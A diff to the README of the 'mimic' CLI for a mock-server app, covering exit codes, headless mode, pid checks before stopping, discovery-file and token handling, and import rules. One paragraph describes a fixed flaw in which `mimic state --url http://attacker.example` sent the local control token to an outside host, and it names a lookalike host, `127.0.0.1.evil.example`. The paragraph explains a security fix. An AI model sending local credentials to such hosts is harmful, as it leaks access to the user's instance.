@@ -1,16 +1,31 @@
 # The `mimic` CLI
 
-Everything Mimic's window can do, from a script. Built for programs first: JSON on stdout,
-diagnostics on stderr, and exit codes that mean something.
+Mimic's projects, endpoints, scenarios, journeys, server and request log, from a script. Built for
+programs first: JSON on stdout, diagnostics on stderr, and exit codes that mean something.
+
+**One thing the window does is not here: importing a spec.** `SpecImport` — the HAR and
+OpenAPI/Swagger parsers — is linked by the app alone, so there is no `mimic import` and no `import`
+command on the HTTP API. A script that wants a spec's routes reads the file itself and issues
+`mimic endpoint create` and `mimic scenario update` per route — the same pair of operations the
+window's review sheet runs when you confirm it, held to the same validation. Do not confuse this with
+`mimic project import`, below: that reads a Mimic project document — the JSON `mimic project export`
+writes — and refuses anything else.
 
 ## Contract
 
 | Exit code | Meaning |
 |-----------|---------|
 | `0` | Success. |
-| `2` | Bad usage — a malformed argument, a missing selector, or an unknown subcommand. |
-| `3` | No reachable Mimic instance. |
-| `4` | The command reached Mimic and Mimic refused it. |
+| `2` | Bad usage — a malformed argument, a missing selector, an unknown subcommand, or a file this CLI could not read. |
+| `3` | There is no Mimic to talk to: nothing is running or reachable, **or** Mimic itself is unavailable — not installed where the CLI looked, would not launch, or the process the discovery file names could not be confirmed or signalled. |
+| `4` | The command reached Mimic and did not come back with a result — Mimic refused it, or answered with something this CLI could not read. |
+
+`3` covers the whole "no Mimic" condition on purpose. "Could not find Mimic.app" and "could not
+signal that pid" used to exit `2`, which told a script the *user* had mistyped something when what
+had happened was that Mimic was not installed, or that the process its discovery file named was gone;
+and inside `mimic app start`, the app-not-found failure and the app-never-answered failure are one
+condition that was being reported under two different codes. The contract stays at four values, so no
+existing branch has to learn a new one.
 
 Every response uses one envelope, so a caller branches on a single boolean and never has to guess
 whether the payload is an error:
@@ -36,8 +51,42 @@ mimic app status               # is anything running, and what is it doing?
 mimic app stop                 # SIGTERM, so pending saves flush
 ```
 
+"Pending saves flush" is a real guarantee now rather than an aspiration: the signal handler writes
+the open project before it exits, bounded at two seconds so a wedged store cannot hang the quit.
+Before that, `mimic endpoint create` followed immediately by `mimic app stop` could lose the endpoint
+the first command had just reported creating — the app answers a control call and then debounces the
+write by 500 ms, and the handler used to exit inside that window.
+
 `app start` **waits for readiness** rather than sleeping a guessed interval, so the next command in a
 script cannot race startup.
+
+`daemon start` is `app start --headless` — not a euphemism for it, the same code: `DaemonCommand.Start`
+sets `headless` on an `AppCommand.Start` and runs it. Both launch `Mimic.app`, and `--headless` only
+adds `MIMIC_HEADLESS=1` to its environment, which makes the app drop its Dock icon and open no
+window. **There is no separate daemon binary**, and nothing about a headless run is a different
+implementation: the commands below are answered by the same host that answers them with a window
+open. Practically, that means a headless run still requires the app bundle to be present — installed,
+or pointed at with `MIMIC_APP_PATH` — and still runs a full `NSApplication` event loop, which is why
+the activation policy is `.accessory` rather than `.prohibited`. The upside is the one that matters
+in a bug report: headless behaviour and on-screen behaviour cannot fork, because they are one binary
+running one host.
+
+`mimic app stop` and `mimic daemon stop` are likewise one thing: `SIGTERM` to the pid in the
+discovery file — **but only after the instance has confirmed that pid is its own.** The CLI asks it
+for `.state` on the port that same file advertises and compares the pid it reports; if that does not
+line up, nothing is signalled and the message says how to stop it by hand. A file left behind by a
+crashed process can name a pid the system has since given to something else, and a `SIGTERM` sent on
+that evidence goes to a stranger.
+
+Two consequences of the check are worth knowing before you meet them:
+
+- **`mimic app stop` ignores `--url`.** A pid only means something on the machine its file was read
+  from, so the instance asked to confirm is the one the file advertises, not one an environment
+  variable points at.
+- **A wedged instance can no longer be stopped this way**, and neither can one whose discovery file
+  carries no token (a pre-token build under a newer CLI). Both refuse with the pid and a
+  `kill <pid>` to run yourself. `SIGTERM` by hand still lets it flush and clean up; `SIGKILL` leaves
+  the discovery file behind.
 
 Set `MIMIC_APP_PATH` to run a build that is not installed in `/Applications` — an Xcode products
 directory, for instance.
@@ -53,6 +102,16 @@ Resolution order, most explicit first:
 
 A discovery file left behind by a crashed process is skipped, so the CLI never hangs on a dead port.
 
+**The token follows the instance, not the URL.** A token read out of `control.json` is a credential
+for *one* instance, so it is attached only when the destination is that instance: a loopback host
+(`127.0.0.1`, `::1`, `[::1]`, `localhost`) **and** the port the file advertised. Destination and
+credential used to be resolved independently, which meant `mimic state --url http://attacker.example`
+sent this machine's live control-plane token to that host in an `X-Mimic-Token` header. Anything
+else — a remote host, a loopback-shaped name like `127.0.0.1.evil.example`, another port on this
+machine — now goes out with no token and comes back `401` if one was needed. To reach an instance
+through a forwarded port or from a container, set `MIMIC_CONTROL_TOKEN`, which is you naming a
+credential rather than the CLI guessing one; it is taken first and this check never touches it.
+
 ## Environment
 
 | Variable | Effect |
@@ -61,11 +120,30 @@ A discovery file left behind by a crashed process is skipped, so the CLI never h
 | `MIMIC_CONTROL_PORT` | Control port on loopback. Default `8787`. |
 | `MIMIC_CONTROL_TOKEN` | Control API token. Normally unnecessary — the CLI reads it from the running instance's `control.json`. Set it on *both* sides when the caller cannot reach that file (a container, a forwarded port). |
 | `MIMIC_DATABASE_PATH` | Where the project store lives. Point at a scratch file for a fully isolated run. |
+| `MIMIC_CONTROL_FILE` | Where the discovery file lives. Honoured by both sides — the instance writes there, `mimic` searches only there — see below. |
 | `MIMIC_HEADLESS` | Set by `--headless`; runs the app without a window. |
 | `MIMIC_APP_PATH` | App bundle to launch. |
 
 `MIMIC_DATABASE_PATH` is the one to reach for in CI: it gives a job its own store, open project
 included, that can be deleted between runs.
+
+`MIMIC_CONTROL_FILE` is the other half of that isolation, and both sides honour it. The instance
+writes its `control.json` there, and `mimic` searches only there, because the override *replaces*
+the default search list rather than joining the front of it — so an isolated run cannot fall through
+to a developer's real instance in either direction. The path is resolved by one implementation,
+`ControlEndpointDiscovery` in the `Domain` module, shared by the app's write side and the CLI's
+reader, so the file a run writes and the file a run reads cannot drift apart. An isolated run
+therefore needs only `MIMIC_DATABASE_PATH` and `MIMIC_CONTROL_FILE`: the destination *and* the
+credential both come out of the relocated file. It used to need four variables — the CLI carried a
+second copy of the discovery reader that ignored the override, so a run that moved the file had to
+name the destination by hand and, easy to miss, `MIMIC_CONTROL_TOKEN` too, or every route answered
+`401` while `mimic app start` still looked fine. `Scripts/run_cli_e2e.sh` still exports two more for
+reasons that are not discovery: `MIMIC_CONTROL_PORT` is the *instance's* bind port, kept off the
+default 8787 a developer's own Mimic may hold, and a fresh `MIMIC_CONTROL_TOKEN` per run means a
+leftover file from an earlier run cannot authenticate against this one.
+
+The parent directory is created `0700` and the file itself is written `0600` wherever it lands: it
+carries the instance's token, and an isolated run is not a less sensitive one.
 
 ## Discovering the surface at runtime
 
@@ -113,6 +191,17 @@ mimic project import project.json [--no-activate]
 
 Re-importing the same document updates the project in place rather than creating a copy, so a CI step
 can import its fixtures on every run.
+
+`project import` takes a **Mimic project document** — what `project export` writes — and nothing else;
+handed an OpenAPI or HAR file it fails with "is not a Mimic project document". Spec import has no
+command at all, as the top of this page explains.
+
+`project open` refuses a project whose stored document schema is **newer than this build
+understands**, with `persistence.failure` and a message naming both version numbers. It is a refusal
+rather than a best-effort read because the fields an older build does not know about are exactly the
+ones it would drop, and a save afterwards would drop them for good. `project list` still shows it —
+a project you cannot open is still a project you have, and hiding it looks like the store having
+lost it. Update Mimic, or export from the newer build.
 
 ### Endpoints
 
@@ -250,8 +339,11 @@ needs the instance's token in an `X-Mimic-Token` header — read it from the dis
 instance writes:
 
 ```bash
-TOKEN=$(python3 -c 'import json,sys;print(json.load(sys.stdin)["token"])' \
-  < ~/Library/Application\ Support/devxa.Mimic/control.json)
+# The installed app is sandboxed, so its Application Support is inside its container. An unsandboxed
+# build writes to ~/Library/Application Support/devxa.Mimic/control.json instead; the CLI looks in
+# both, in that order, which is why it needs no configuration.
+CONTROL=~/Library/Containers/devxa.Mimic/Data/Library/Application\ Support/devxa.Mimic/control.json
+TOKEN=$(python3 -c 'import json,sys;print(json.load(sys.stdin)["token"])' < "$CONTROL")
 
 curl -s -H "X-Mimic-Token: $TOKEN" http://127.0.0.1:8787/v1/state
 curl -s -H "X-Mimic-Token: $TOKEN" http://127.0.0.1:8787/v1/commands
@@ -288,7 +380,10 @@ reach a loopback port, so the token and the `Origin`/`Host` checks are what actu
 
 - **The CLI hosts nothing.** No server, no database. Every invocation reads and writes the one live
   instance, so two commands a second apart cannot disagree about the world — and `mimic` stays a
-  small static binary that links neither Vapor nor GRDB.
+  small static binary that links neither Vapor nor GRDB. That last clause is checked rather than
+  asserted: [`Scripts/check_module_edges.py`](../Scripts/check_module_edges.py) walks both manifests
+  on every CI run and fails if `MimicCLICore` or the `mimic` executable can reach Vapor, GRDB or
+  `SpecImport` by any path — including through a target that acquires one of them later.
 - **One implementation of the rules.** Project-scoped commands are applied by `ProjectCommandExecutor`
   in the `Domain` module, which the CLI, the HTTP API, and the app window all call. A rule can only be
   written once, so the window and the script cannot drift.
